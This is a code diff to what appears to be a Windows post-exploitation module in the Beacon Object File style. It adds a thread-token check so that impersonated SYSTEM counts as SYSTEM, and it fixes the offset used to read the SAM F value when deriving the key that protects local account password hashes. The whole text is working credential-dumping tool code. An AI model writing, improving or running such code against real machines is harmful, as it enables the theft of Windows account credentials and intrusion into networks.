@@ -20,6 +20,7 @@
 
 /* --- KERNEL32 --- */
 DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentProcess(void);
+DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentThread(void);
 DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
 DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
 DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);
@@ -38,6 +39,7 @@ DECLSPEC_IMPORT LONG    WINAPI ADVAPI32$RegQueryInfoKeyW(HKEY, LPWSTR, LPDWORD, 
 DECLSPEC_IMPORT LONG    WINAPI ADVAPI32$RegEnumKeyExW(HKEY, DWORD, LPWSTR, LPDWORD, LPDWORD, LPWSTR, LPDWORD, PFILETIME);
 DECLSPEC_IMPORT LONG    WINAPI ADVAPI32$RegCloseKey(HKEY);
 DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
+DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$OpenThreadToken(HANDLE, DWORD, BOOL, PHANDLE);
 DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$DuplicateTokenEx(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
 DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
 DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$RevertToSelf(void);
@@ -271,8 +273,11 @@ static BOOL _enable_privilege(HANDLE hToken, LPCWSTR privName) {
 
 static BOOL _is_system(void) {
     HANDLE hToken = NULL;
-    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken))
-        return FALSE;
+    /* Check thread token first (impersonation), fall back to process token */
+    if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken)) {
+        if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken))
+            return FALSE;
+    }
     DWORD len = 0;
     ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &len);
     unsigned char *buf = (unsigned char *)_alloc(len);
@@ -445,7 +450,16 @@ static BOOL _get_sam_key(const unsigned char *bootKey, const unsigned char *fVal
                           DWORD fLen, unsigned char *samKey) {
     if (fLen < 0xA0) return FALSE;
 
-    DWORD revision = *(DWORD *)(fValue + 0x00);
+    /*
+     * SAM F value layout:
+     *   0x00: struct revision (always 2 or 3 for the overall struct)
+     *   0x68: crypto revision (2 = RC4/MD5, 3 = AES)
+     *   0x70: salt (16 bytes) for RC4 path
+     *   0x78: salt (16 bytes) for AES path
+     *   0x80: encrypted key (RC4 path)
+     *   0x88: encrypted key (AES path)
+     */
+    DWORD revision = *(DWORD *)(fValue + 0x68);
 
     if (revision == 3) {
         /* AES-based (Vista+): salt at 0x78, encrypted key at 0x88 */
